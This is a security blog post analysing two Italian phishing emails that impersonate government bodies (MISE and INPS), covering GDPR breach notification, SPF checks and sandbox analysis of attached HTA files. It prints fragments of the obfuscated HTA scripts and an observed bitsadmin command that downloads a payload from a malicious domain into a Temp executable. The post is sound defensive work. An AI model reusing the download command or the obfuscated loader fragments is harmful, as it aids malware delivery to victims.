<!doctype html><html lang=en><head><meta name=google-site-verification content="NTPifZ1gNpp6HSoC60ErvHiUUor86ZXg4yHtlpk9lwU"><title>Andrea Dainese > Malware analysis</title><meta charset=utf-8><meta name=author content="Andrea Dainese"><meta name=description content="These days I&rsquo;m receiving more requests for help than ever. Most of them refer to suspicious emails, maybe because people are more aware, maybe because the current geopolitical situation is evolving fast."><meta name=generator content="Hugo 0.115.3"><meta name=“robots” content="“noarchive”"><meta name=“robots” content="“notranslate”"><meta name=robots content="noimageindex"><meta property="og:title" content="Malware analysis"><meta property="og:description" content="These days I&rsquo;m receiving more requests for help than ever. Most of them refer to suspicious emails, maybe because people are more aware, maybe because the current geopolitical situation is evolving fast."><meta property="og:type" content="article"><meta property="og:url" content="https://www.adainese.it/blog/2022/03/25/malware-analysis/"><meta property="og:image" content="https://www.adainese.it/images/wallpapers/wallpaper-website.png"><meta property="article:section" content="blog"><meta property="article:published_time" content="2022-03-25T00:00:00+00:00"><meta property="article:modified_time" content="2022-03-25T00:00:00+00:00"><meta property="og:site_name" content="Andrea Dainese"><meta name=twitter:card content="summary"><meta name=twitter:site content="@adainese"><meta name=twitter:image content="https://www.adainese.it/images/logo-ad-transparent-wo-name.png"><meta name=twitter:title content="Andrea Dainese > Malware analysis"><meta name=twitter:description content="These days I&rsquo;m receiving more requests for help than ever. Most of them refer to suspicious emails, maybe because people are more aware, maybe because the current geopolitical situation is evolving fast."><meta name=viewport content="width=device-width,initial-scale=1"><link rel=alternate type=application/rss+xml title="RSS Feed for blog" href=/blog/index.xml><link rel=dns-prefetch href=https://www.googletagmanager.com><link href=https://www.googletagmanager.com rel=preconnect crossorigin><link rel=apple-touch-icon sizes=57x57 href=/favicon/apple-icon-57x57.png><link rel=apple-touch-icon sizes=60x60 href=/favicon/apple-icon-60x60.png><link rel=apple-touch-icon sizes=72x72 href=/favicon/apple-icon-72x72.png><link rel=apple-touch-icon sizes=76x76 href=/favicon/apple-icon-76x76.png><link rel=apple-touch-icon sizes=114x114 href=/favicon/apple-icon-114x114.png><link rel=apple-touch-icon sizes=120x120 href=/favicon/apple-icon-120x120.png><link rel=apple-touch-icon sizes=144x144 href=/favicon/apple-icon-144x144.png><link rel=apple-touch-icon sizes=152x152 href=/favicon/apple-icon-152x152.png><link rel=apple-touch-icon sizes=180x180 href=/favicon/apple-icon-180x180.png><link rel=icon type=image/png sizes=192x192 href=/favicon/android-icon-192x192.png><link rel=icon type=image/png sizes=16x16 href=/favicon/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=/favicon/favicon-32x32.png><link rel=icon type=image/png sizes=96x96 href=/favicon/favicon-96x96.png><link rel=stylesheet type=text/css href=/plugins/fontawesome/css/all.min.css><link rel=stylesheet type=text/css href=/plugins/fancybox/jquery.fancybox.min.css><link rel=stylesheet type=text/css href=/fonts/opensans/opensans.css><link rel=stylesheet href=/css/style.min.db8a68dfac8ad6ed301e5f04872a83daee269833ef371fd9ec9475b745de14e5.css integrity="sha256-24po36yK1u0wHl8EhyqD2u4mmDPvNx/Z7JR1t0XeFOU="><link rel=stylesheet href=/css/print.min.a3802e6b39df8780c4980151b47550b34687a140e148c71342fb463b5322e6b1.css media=print integrity="sha256-o4Auaznfh4DEmAFRtHVQs0aHoUDhSMcTQvtGO1Mi5rE="></head><body><button type=button class="mobile-nav-toggle d-lg-none" aria-label="Toggle navigation"><i class="fas fa-bars"></i></button><header id=header class=fixed-top><div class="container d-flex"><div class="logo mr-auto"><h1><a href=/#><span>Andrea</span> Dainese</a></h1></div><nav class="nav-menu d-none d-lg-block"><ul><li><a href=/#>Home</a></li><li><a href=/#about>About</a></li><li class=active><a href=/blog>Blog</a></li><li><a href=/categories>Categories</a></li><li><a href=https://www.patreon.com/adainese target=_blank rel=noreferrer><i class="fa fa-heart"></i></a></li><li><a href=https://www.spreaker.com/podcast/info-sec-unplugged--6025156 target=_blank rel=noreferrer><i class="fa fa-podcast"></i></a></li><li><form class="form-inline ml-2" action=/search><div class="input-group mb-3"><input id=search-query type=text class=form-control placeholder=Search... name=s aria-label="Search within the website" aria-describedby=basic-addon2><div class=input-group-append><button class="btn btn-outline-primary" type=submit aria-label=Search>
<i class="fa fa-search"></i></button></div></div></form></li></ul></nav></div></header><div id=page-header><div class=home-overlay></div><div class=container><div class=row><div class=col-12><div class="page-header-size text-center"><h1>Malware analysis</h1></div></div></div></div></div><main id=main><div class=blogpost-single><div class=container><div class=row><div class="col-xs-12 col-sm-12 col-md-4 d-print-none"><div class=blogpost-nav><div class="d-none d-md-block"><div class=blogpost-nav-content><h4>Table of contents</h4><div class=toce><nav id=TableOfContents><ul><li><a href=#gdpr-recap>GDPR recap</a></li><li><a href=#notification>Notification</a></li><li><a href=#email-analysis>Email analysis</a><ul><li><a href=#case-1-email-headers-and-body>Case 1 email headers and body</a></li><li><a href=#case-2-email-headers-and-body>Case 2 email headers and body</a></li></ul></li><li><a href=#spf-analysis>SPF analysis</a><ul><li><a href=#mise-spf-record-analysis>MISE SPF record analysis</a></li><li><a href=#inps-spf-record-analysis>INPS SPF record analysis</a></li></ul></li><li><a href=#attachment-analysis>Attachment analysis</a><ul><li><a href=#mise-attachment-analysis>MISE attachment analysis</a></li><li><a href=#inps-attachment-analysis>INPS attachment analysis</a></li></ul></li><li><a href=#conclusions-and-suggested-best-practices>Conclusions and suggested best practices</a></li></ul></nav></div></div></div><div class="d-none d-md-block"><div class=blogpost-nav-content><h4>Latest posts</h4><div class=recent-post><div class=recent-post-img><a href=/blog/2025/10/26/managing-cisco-ndo-limitations-from-the-apic/><img class="img-fluid rounded" src=/images/vendors/cisco.webp alt="Post cover"></a></div><div class=recent-post-content><p><a href=/blog/2025/10/26/managing-cisco-ndo-limitations-from-the-apic/>Managing Cisco NDO Limitations from the APIC</a><br><i class="fa fa-calendar"></i>
October 26, 2025</p></div></div><div class=recent-post><div class=recent-post-img><a href=/blog/2025/10/19/simplifying-the-data-structure/><img class="img-fluid rounded" src=/images/categories/learning-paths.webp alt="Post cover"></a></div><div class=recent-post-content><p><a href=/blog/2025/10/19/simplifying-the-data-structure/>Simplifying the Data Structure</a><br><i class="fa fa-calendar"></i>
October 19, 2025</p></div></div><div class=recent-post><div class=recent-post-img><a href=/blog/2025/10/12/frameworks-for-projects-with-cisco-aci-and-ndo/><img class="img-fluid rounded" src=/images/vendors/cisco.webp alt="Post cover"></a></div><div class=recent-post-content><p><a href=/blog/2025/10/12/frameworks-for-projects-with-cisco-aci-and-ndo/>Frameworks for Projects with Cisco ACI and NDO</a><br><i class="fa fa-calendar"></i>
October 12, 2025</p></div></div><div class=recent-post><div class=recent-post-img><a href=/blog/2025/10/05/creating-an-interface-in-strata-cloud-manager/><img class="img-fluid rounded" src=/images/vendors/paloalto.webp alt="Post cover"></a></div><div class=recent-post-content><p><a href=/blog/2025/10/05/creating-an-interface-in-strata-cloud-manager/>Creating an interface in Strata Cloud Manager</a><br><i class="fa fa-calendar"></i>
October 05, 2025</p></div></div><div class=recent-post><div class=recent-post-img><a href=/blog/2025/10/01/circular-dependencies-with-ndo/><img class="img-fluid rounded" src=/images/categories/learning-paths.webp alt="Post cover"></a></div><div class=recent-post-content><p><a href=/blog/2025/10/01/circular-dependencies-with-ndo/>Circular Dependencies with NDO</a><br><i class="fa fa-calendar"></i>
October 01, 2025</p></div></div></div></div><div class="d-none d-md-block"><div class=blogpost-nav-content><h4>Categories</h4><div class=recent-post><div class=recent-post-img><a href=/categories/automation><img class="img-fluid rounded" src=/images/categories/automation.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/automation>Automation</a><br><i class="fa fa-blog"></i> 164 posts</p></div></div><div class=recent-post><div class=recent-post-img><a href=/categories/learning-paths><img class="img-fluid rounded" src=/images/categories/learning-paths.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/learning-paths>Learning paths</a><br><i class="fa fa-blog"></i> 128 posts</p></div></div><div class=recent-post><div class=recent-post-img><a href=/categories/ciso><img class="img-fluid rounded" src=/images/categories/ciso.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/ciso>CISO</a><br><i class="fa fa-blog"></i> 23 posts</p></div></div><div class=recent-post><div class=recent-post-img><a href=/categories/personal-security><img class="img-fluid rounded" src=/images/categories/personal-security.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/personal-security>Personal Security</a><br><i class="fa fa-blog"></i> 22 posts</p></div></div><div class=recent-post><div class=recent-post-img><a href=/categories/security><img class="img-fluid rounded" src=/images/categories/security.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/security>Security</a><br><i class="fa fa-blog"></i> 20 posts</p></div></div><div class=recent-post><div class=recent-post-img><a href=/categories/notes><img class="img-fluid rounded" src=/images/categories/notes.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/notes>Notes</a><br><i class="fa fa-blog"></i> 19 posts</p></div></div><div class=recent-post><div class=recent-post-img><a href=/categories/infrastructure><img class="img-fluid rounded" src=/images/categories/infrastructure.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/infrastructure>Infrastructure</a><br><i class="fa fa-blog"></i> 12 posts</p></div></div><div class=recent-post><div class=recent-post-img><a href=/categories/ot-ics><img class="img-fluid rounded" src=/images/categories/ot-ics.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/ot-ics>OT/ICS</a><br><i class="fa fa-blog"></i> 5 posts</p></div></div><div class=recent-post><div class=recent-post-img><a href=/categories/books><img class="img-fluid rounded" src=/images/categories/books.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/books>Books</a><br><i class="fa fa-blog"></i> 3 posts</p></div></div><div class=recent-post><div class=recent-post-img><a href=/categories/unetlab><img class="img-fluid rounded" src=/images/categories/unetlab.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/unetlab>UNetLab</a><br><i class="fa fa-blog"></i> 3 posts</p></div></div><div class=recent-post><div class=recent-post-img><a href=/categories/writeup><img class="img-fluid rounded" src=/images/categories/writeup.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/writeup>Write-up</a><br><i class="fa fa-blog"></i> 3 posts</p></div></div><div class=recent-post><div class=recent-post-img><a href=/categories/osint><img class="img-fluid rounded" src=/images/categories/osint.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/osint>OSInt</a><br><i class="fa fa-blog"></i> 2 posts</p></div></div><div class=recent-post><div class=recent-post-img><a href=/categories/life><img class="img-fluid rounded" src=/images/categories/life.webp alt="Category cover"></a></div><div class=recent-post-content><p><a href=/categories/life>My life</a><br><i class="fa fa-blog"></i> 1 posts</p></div></div></div></div></div></div><div class="col-xs-12 col-sm-12 col-md-8 blogpost-container"><div class=row><div class="col-md-12 col-sm-12 col-xs-12"><article><div class=blogpost-single-content><h2>Malware analysis</h2><div class=blogpost-single-meta><div><i class="fa fa-user"></i> Andrea Dainese</div><div><i class="fa fa-calendar"></i>
March 25, 2022</div><div class=tag-meta><i class="fa fa-folder"></i>
<a href=/categories/security/ title="All posts under Security">Security</a></div></div><div class=entry-content><div><a data-fancybox=gallery href=/images/categories/security.webp><img class="img-fluid w-25 rounded shadow float-right" src=/images/categories/security.webp alt="Post cover"></a></div><p>These days I&rsquo;m receiving more requests for help than ever. Most of them refer to suspicious emails, maybe because people are more aware, maybe because the current geopolitical situation is evolving fast.</p><p>I want to present a couple of cases I recently received to help:</p><ul><li>IT managers to properly set up a notification and response process;</li><li>end-users to evaluate suspicious emails.</li></ul><h2 id=gdpr-recap>GDPR recap</h2><p>European firms should already have a data breach notification process defined and communicated to employees. But just in case let&rsquo;s review relevant GDPR articles:</p><ul><li>Art. 4.12 - Definitions: personal data breach means a breach of security leading to the *<em>accidental or unlawful destruction, loss, alteration, unauthorized disclosure of, or access to, personal data</em>- transmitted, stored or otherwise processed;</li><li>Art. 33.1 - Notification of a personal data breach to the supervisory authority: <strong>In the case of a personal data breach, the controller shall</strong> - without undue delay and, where feasible, *<em>not later than 72 hours after having become aware of it, notify the personal data breach to the supervisory authority competent</em>- in accordance with Article 55, <strong>unless the personal data breach is unlikely to result in a risk to the rights and freedoms of natural persons</strong>. Where the notification to the supervisory authority is not made within 72 hours, it shall be accompanied by reasons for the delay.</li><li>Art. 33.5 - Notification of a personal data breach to the supervisory authority: The controller <strong>shall document any personal data breaches, comprising the facts relating to the personal data breach, its effects, and the remedial action is taken</strong>. That documentation shall enable the supervisory authority to verify compliance with this Article.</li></ul><p>In practice, firms must have procedures to:</p><ul><li>communicate data breaches to the firm itself (notification);</li><li>evaluate the risk associated with data breaches (response);</li><li>registry data breaches and related analysis (tracking).</li></ul><p>Referring to the GDPR data breach definition, we can say that most of the incidents are security incidents. In fact, following ITIL, incidents are:</p><blockquote><p>ITIL defines an incident as an unplanned interruption to or quality reduction of an IT service.</p></blockquote><p>But an unplanned event will affect personal data one way or another, so any incident affecting personal data is defined as a data breach. Thus we can have a single set of procedures describing the incident management process.</p><h2 id=notification>Notification</h2><p>We are speaking about incident management procedures in a later article. For now, just be sure a notification process is in place inside the organization. For the sake of this specific post, the notification is referring to the user&rsquo;s request about a suspicious email. The users are required to forward as an attachment any suspicious email or use any integration which will automatically do the same thing.</p><p>I&rsquo;m also using the same procedure to evaluate how many users are detecting phishing emails and alerting the SOC.</p><h2 id=email-analysis>Email analysis</h2><p>In most cases, I get an email in <code>msg</code> format (from Microsoft Outlook). I&rsquo;m converting them into <code>eml</code> format using:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msgconvert *.msg
</span></span></code></pre></div><p>Below you can see email headers and bodies for both cases. From a user perspective:</p><ul><li>emails are written in correct Italian;</li><li>there is no valid reason why a government department would write via standard email (in Italy we have a special email system called PEC);</li><li>both emails are unsolicited;</li><li>both emails have image trackers;</li><li>both emails have attachments (ZIP files).</li></ul><p>Because emails are unsolicited and because of the ZIP files attached, users should notify email to the internal department for additional analysis. To be honest, I won&rsquo;t blame users that click on them because they are very well-formatted.</p><p>Questions we need to answer:</p><ul><li>Are the emails malicious?</li><li>Why have emails been delivered to users and not filtered by the anti-spam?</li><li>Does anyone open and execute attachments?</li></ul><h3 id=case-1-email-headers-and-body>Case 1 email headers and body</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>Date: Tue, 8 Mar 2022 12:06:44 +0000
</span></span><span style=display:flex><span>Subject: Circolare  07.03.2022  , comunicazione  aiuti per le  societa
</span></span><span style=display:flex><span>From: mise.gov.it &lt;ufficio@mise.gov.it&gt;
</span></span><span style=display:flex><span>To: &lt;mario.rossi@example.com&gt;
</span></span><span style=display:flex><span>Received: from plexkck-1.localdomain ([5.135.192.105]) by
</span></span><span style=display:flex><span> antispam.example.com with ESMTP id nCz5MOHOACUQg9dv (version=TLSv1.2
</span></span><span style=display:flex><span> cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128 verify=NO) for
</span></span><span style=display:flex><span> &lt;mario.rossi@example.com&gt;; Tue, 08 Mar 2022 13:06:45 +0100 (CET)
</span></span><span style=display:flex><span>Received: by plexkck-1.localdomain (Postfix, from userid 10004) id
</span></span><span style=display:flex><span> 90A8BA190C; Tue,  8 Mar 2022 12:06:44 +0000 (UTC)
</span></span><span style=display:flex><span>Reply-To: &lt;ufficio@mise.gov.it&gt;
</span></span><span style=display:flex><span>X-Virus-Scanned: by bsmtpd at example.com
</span></span><span style=display:flex><span>Return-Path: iptvtc@iptvtc.com
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>  &lt;https://i.ibb.co/nmbxdJ7/external-content-duckduckgo-com.jpg&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Il Ministero dello Sviluppo Economico, dipartimento per lo sviluppo dell&#39;economi
</span></span><span style=display:flex><span>a,
</span></span><span style=display:flex><span>sezione per la promozione delle attivita imprenditoriali, Dispone:
</span></span><span style=display:flex><span>La presente circolare fornisce chiarimenti in merito alla tipologia, alle condizioni,
</span></span><span style=display:flex><span>ai limiti, alla durata e alle modalita di fruizione delle
</span></span><span style=display:flex><span>agevolazioni fiscali e contributive previste per il pacchetto di aiuti alle ditte ,
</span></span><span style=display:flex><span>al fine di portare a conoscenza dei soggetti interessati, anteriormente.
</span></span><span style=display:flex><span>In allegato l&#39;archivio recante i dettagli riguardanti le singole tipologie di attivita e l&#39;elenco delle varie modalita di fruizione.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Via Giorgione, 2b - 00147 Roma
</span></span><span style=display:flex><span>mise.gov.it
</span></span></code></pre></div><h3 id=case-2-email-headers-and-body>Case 2 email headers and body</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>Date: Wed, 23 Feb 2022 06:46:54 +0100
</span></span><span style=display:flex><span>Subject: notifica al contribuente per documentazione mancante
</span></span><span style=display:flex><span>From: Vincenzo Damato &lt;vincenzo.damato@inps.it&gt;
</span></span><span style=display:flex><span>To: &lt;privacy@example.com&gt;
</span></span><span style=display:flex><span>Received: from h2677552.stratoserver.net (advancedesign.de [85.214.135.204])
</span></span><span style=display:flex><span> by antispam.example.com with ESMTP id aN9SvNX5AeAZooYL (version=TLSv1.2
</span></span><span style=display:flex><span> cipher=ECDHE-RSA-AES128-GCM-SHA256 bits=128 verify=NO) for
</span></span><span style=display:flex><span> &lt;privacy@example.com&gt;; Wed, 23 Feb 2022 06:46:55 +0100 (CET)
</span></span><span style=display:flex><span>Received: by h2677552.stratoserver.net (Postfix, from userid 10001) id
</span></span><span style=display:flex><span> 843862561C61; Wed, 23 Feb 2022 06:46:54 +0100 (CET)
</span></span><span style=display:flex><span>Reply-To: &lt;vincenzo.damato@inps.it&gt;
</span></span><span style=display:flex><span>X-Virus-Scanned: by bsmtpd at example.com
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>  &lt;https://i.ibb.co/51VfRPp/INPS.jpg&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Gentile contribuente,
</span></span><span style=display:flex><span>Le notifichiamo che non è stata accolta la domanda in oggetto , corrisposta il 14.01.2021 , per il seguente motivo :
</span></span><span style=display:flex><span>Lei non ha fornito la documentazione che è stata richiesta il 04/01/2021 e, di conseguenza, non è stato possibile proseguire all&#39;accertamento del diritto alla prestazione.
</span></span><span style=display:flex><span>La informiamo oltre a tutto che, nel caso in cui volesse contrastare il presente provvedimento, potrà presentare un reclamo amministrativo solamente on line tramite l&#39;apposita sezione sul portale INPS.
</span></span><span style=display:flex><span>L&#39;eventuale azione giudiziaria contro il presente provvedimento dovrà essere notificata presso questa agenzia, avendo il rappresentante legale dell&#39;istituto eletto a tal fine domicilio speciale presso l&#39;agenzia stessa, ai sensi dell&#39;art. 48 del codice penale e per gli effetti di cui all&#39;art. 30 del codice di procedura civile .
</span></span><span style=display:flex><span>La preghiamo di prendere visione della documentazione esaustiva riguardante la sua richiesta e il provvedimento, entrambi presenti nell&#39;archivio allegato e scaricabile nella presente e-mail. L&#39;ufficio è a sua completa disposizione per ogni informazione o chiarimento.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Il responsabile di unità operativa
</span></span><span style=display:flex><span>Vincenzo Damato
</span></span></code></pre></div><h2 id=spf-analysis>SPF analysis</h2><p>The first question that popped into my mind was about the anti-spam: is it working fine?</p><p>The basic check requires evaluating the SPF record and finding out if source IP addresses were allowed to send those emails. Let&rsquo;s get the SPF record:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dig -t txt mise.gov.it +noall +answer
</span></span><span style=display:flex><span>dig -t txt inps.it +noall +answer
</span></span></code></pre></div><h3 id=mise-spf-record-analysis>MISE SPF record analysis</h3><p>The SPF record for MISE is:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>v=spf1 ip4:85.20.209.229 ip4:85.20.209.232 ip4:212.17.196.121 ip4:89.119.244.34 ip4:89.119.244.35 ip4:89.119.244.88 ip4:85.20.124.52 ip4:89.119.244.44 include:esg01.mise.gov.it include:esg02.mise.gov.it include:esg03.mise.gov.it -all
</span></span></code></pre></div><p>The source IP address of MISE email is: <code>5.135.192.105</code>. It is assigned to a German company, and it is included in some
<a href="https://talosintelligence.com/reputation_center/lookup?search=5.135.192.105" target=_blank rel=noopener>RBL lists</a>
and it is
<a href="https://mxtoolbox.com/SuperTool.aspx?action=spf%3ainps.it%3a85.214.135.204&amp;run=toolpage" target=_blank rel=noopener>not included in the SPF record</a>
.</p><p>The anti-spam should have filtered it, so it&rsquo;s misconfigured.</p><h3 id=inps-spf-record-analysis>INPS SPF record analysis</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>v=spf1 ip4:89.97.177.19 ip4:89.97.177.3 ip4:93.63.43.112 ip4:93.63.43.115 ip4:93.63.43.113 ip4:93.63.43.114 ~all
</span></span></code></pre></div><p>The source IP address of INPS email is: <code>85.214.135.204</code>. It is assigned to a German company, and it is not included in
<a href="https://talosintelligence.com/reputation_center/lookup?search=5.135.192.105" target=_blank rel=noopener>RBL lists</a>
and it is definitely
<a href="https://mxtoolbox.com/SuperTool.aspx?action=spf%3ainps.it%3a85.214.135.204&amp;run=toolpage" target=_blank rel=noopener>not included in the SPF record</a>
.</p><p>The anti-spam should have filtered it or added a <code>SPAM</code> tag, so it&rsquo;s misconfigured.</p><h2 id=attachment-analysis>Attachment analysis</h2><p>Both emails contain a ZIP file, to extract attachments from <code>eml</code> files I use:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>munpack *.eml
</span></span></code></pre></div><p>Both emails contain a compressed <code>hta</code> file. HTA stands for HTML Application, and it&rsquo;s an executable HTML page that contains some script code (<strong>What a great idea!</strong>). The file is executed through <code>mshta.exe</code> available by default.</p><p>We are using
<a href=virustotal.com/ title=VirusTotal>VirusTotal</a>
and
<a href=https://any.run/ title=Any.Run target=_blank rel=noopener>Any.Run</a>
to analyze them. Remember: don&rsquo;t upload any confidential files on those portals because they will be shared with subscribers.</p><h3 id=mise-attachment-analysis>MISE attachment analysis</h3><p>The MISE HTA file is obfuscated and appears to be encrypted:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>&lt;META NAME=&#39;GENERATOR&#39; Content=&#39;The source code of this page is encrypted with HTML Guardian,  the world&#39;s standart for website protection. Visit http://www.protware.com for details&#39;&gt;&lt;meta http-equiv=&#39;expires&#39; content=&#39;&#39;&gt;
</span></span><span style=display:flex><span>&lt;script&gt;l1l=document.documentMode||document.all;var ca8b5d6e=true;ll1=document.layers;lll=window.sidebar;ca8b5d6e=(!(l1l&amp;&amp;ll1)&amp;&amp;!(!l1l&amp;&amp;!ll1&amp;&amp;!lll));l_ll=location+&#39;&#39;;l11=navigator.userAgent.toLowerCase();function lI1(l1I){return l11.indexOf(l1I)&gt;0?true:false};lII=lI1(&#39;kht&#39;)|lI1(&#39;per&#39;);ca8b5d6e|=lII;zLP=location.protocol+&#39;0FD&#39;;qxPX21ALo321P=&#39;vrexI&#39;;&lt;/script&gt;
</span></span><span style=display:flex><span>&lt;script&gt;...&lt;/script&gt;
</span></span></code></pre></div><p>Few anti-malware report it as malware, as per
<a href="https://www.virustotal.com/gui/file-analysis/NzU4NDFhZjZmZjc1Njg5ZTYyZDgxZDdmMjE2N2YzMzE6MTY0ODEzODg4Mw==" title="VirusTotal report" target=_blank rel=noopener>VirusTotal report</a>
. The initial report is from <code>2022-03-24 16:21:23 UTC</code> reported by myself. It will probably change in the future.</p><p>If we execute the file using AnyRun, we can see that it downloads a file using <code>BITSADMIN.EXE</code>:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>&#34;C:\Windows\System32\bitsadmin.exe&#34; /transfer 8 http://ecologilink.top/notepad.txt C:\Users\admin\AppData\Local\Temp\online.exe
</span></span></code></pre></div><p>The malicious server is no more available, so the malware, even if executed, is harmless. We should now check who has downloaded <code>http://ecologilink.top/notepad.txt</code> and verify if the anti-malware logs.</p><p>You can see the
<a href=https://any.run/report/69dba283d546ac64008f8d9a85e33cf64ffcdc79e2498c8214019900da3d3bec/b47f687e-e6bb-49c2-adc2-3b92a5a4d4ba title="Any.Run report" target=_blank rel=noopener>full report Any.Run report</a>
and look at malware behavior.</p><p><a data-fancybox=gallery href=/blog/2022/03/25/malware-analysis/case-1-attack-matrix.webp><img sizes="1200 2452 " srcset="/blog/2022/03/25/malware-analysis/case-1-attack-matrix_hu9d102f49453f6ab6813f68995278f20e_23792_1200x0_resize_q75_h2_box_2.webp /blog/2022/03/25/malware-analysis/case-1-attack-matrix.webp" src=/blog/2022/03/25/malware-analysis/case-1-attack-matrix.webp alt="MITRE ATT&amp;CK Matrix" class="img-fluid rounded shadow mx-auto d-block text-center"></a></p><h3 id=inps-attachment-analysis>INPS attachment analysis</h3><p>The INPS HTA file is obfuscated:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>&lt;<span style=color:#f92672>script</span> <span style=color:#a6e22e>language</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;vbscript&#34;</span>&gt;
</span></span><span style=display:flex><span><span style=color:#a6e22e>execute</span>(<span style=color:#960050;background-color:#1e0010>&#34;</span><span style=color:#a6e22e>XRQyEEDmMAdVnEQgHZjytwdffVifYTQiMDH</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>array</span>(<span style=color:#ae81ff>192</span>, <span style=color:#ae81ff>224</span>, <span style=color:#ae81ff>117</span>, <span style=color:#ae81ff>214</span>, <span style=color:#ae81ff>188</span>, <span style=color:#ae81ff>201</span>, ...
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>script</span>&gt;
</span></span></code></pre></div><p>Few anti-malware report it as malware, as per
<a href="https://www.virustotal.com/gui/file-analysis/NzU4NDFhZjZmZjc1Njg5ZTYyZDgxZDdmMjE2N2YzMzE6MTY0ODEzODg4Mw==" target=_blank rel=noopener>VirusTotal report</a>
.</p><p>Few anti-malware reports it as malware, as per
<a href=https://www.virustotal.com/gui/file/88431a0d14112c4019da607c75af245b1c370fc59290fa8bfe28e924bfbce411 target=_blank rel=noopener>VirusTotal report</a>
. The initial report is from <code>2022-02-23 08:51:27 UTC</code> reported by myself. It will probably change in the future.</p><p>If we execute the file using AnyRun, we can see that it triggers the download of some files from WindowsUpdate and DigiCert. Both sites are secure, but I guess the malware has detected the AnyRun sandbox and stopped the execution.</p><p>According to the
<a href=https://any.run/report/88431a0d14112c4019da607c75af245b1c370fc59290fa8bfe28e924bfbce411/83f82790-7c1e-49c3-96f8-f87ca6d83d28 title="Any.Run report" target=_blank rel=noopener>full report Any.Run report</a>
we can see that the malware accessed a lot of Windows Registry keys, and in particular, has gathered information about NTP and localization. We can assume that the malware stopped because it recognized the sandbox.</p><p><a data-fancybox=gallery href=/blog/2022/03/25/malware-analysis/case-2-attack-matrix.webp><img sizes="1200 2462 " srcset="/blog/2022/03/25/malware-analysis/case-2-attack-matrix_hu90cbdec87d222b984b6344c17ce4015b_21094_1200x0_resize_q75_h2_box_2.webp /blog/2022/03/25/malware-analysis/case-2-attack-matrix.webp" src=/blog/2022/03/25/malware-analysis/case-2-attack-matrix.webp alt="MITRE ATT&amp;CK Matrix" class="img-fluid rounded shadow mx-auto d-block text-center"></a></p><h2 id=conclusions-and-suggested-best-practices>Conclusions and suggested best practices</h2><p>Besides the malware analysis approach I used, we realized that organizations should have in place a procedure to notify events and anomalies. Specific training should be delivered to end-users also, covering:</p><ul><li>basic email analysis to identify SPAM and malware emails;</li><li>How to request helps and notify those emails;</li><li>responsibility of the users regarding malware notification especially if they clicked on the malicious attachment (be inclusive, avoid punishment).</li></ul><p>Moreover, from a technical perspective:</p><ul><li>fix and verify the anti-spam configuration (possibly filter out some attachment file types);</li><li>deny URLs included in malicious categories;</li><li>deny URLs not already categorized (new domains);</li><li>implement SSL inspection for outgoing web traffic (exclude sensitive websites, like banking and update the internal policy);</li><li>implement a logging platform and include it in the incident management process.</li></ul></div></div></article><div class=clear></div></div></div></div></div></div></div></main><footer class=d-print-none><div class=footer-profile><div class=container id=contact><div class=row><div class="col-xs-12 col-sm-12 col-md-4"><div class=footer-head><h2><span>Andrea</span> Dainese</h2></div><p>For information, collaborations, proposals, requests for help, donations, use one of the following channels; email is preferred.</p><div class=footer-icons><ul><li><a href=https://www.patreon.com/adainese title="Support me" target=_blank rel=noreferrer><i class="fa fa-heart"></i></a></li><li><a 